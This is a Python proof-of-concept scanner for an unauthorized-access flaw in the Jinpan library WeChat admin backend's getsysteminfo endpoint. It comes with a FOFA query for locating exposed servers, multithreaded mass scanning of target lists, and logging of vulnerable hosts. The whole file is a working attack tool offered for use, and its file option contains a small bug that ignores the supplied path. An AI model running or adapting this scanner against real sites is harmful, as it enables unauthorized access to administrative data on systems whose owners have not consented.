#金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# title=“微信管理后台” && icon_hash=“116323821”

def banner():
    test ="""
 ██████╗ ███████╗████████╗███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗██╗███╗   ██╗███████╗ ██████╗ 
██╔════╝ ██╔════╝╚══██╔══╝██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██║████╗  ██║██╔════╝██╔═══██╗
██║  ███╗█████╗     ██║   ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║██║██╔██╗ ██║█████╗  ██║   ██║
██║   ██║██╔══╝     ██║   ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██║   ██║
╚██████╔╝███████╗   ██║   ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║██║██║ ╚████║██║     ╚██████╔╝
 ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ 
                                                                                                             
                                                        author:果冻                                                                                                                                                               
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞POC")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    api_payload = "/admin/weichatcfg/getsysteminfo"
    try:
        res1 = requests.get(url=target+api_payload,verify=False,timeout=10)
        if res1.status_code==200 and 'id' in res1.text:
            print(f"[+]{target} 存在未授权访问漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在未授权访问漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == "__main__":
    main()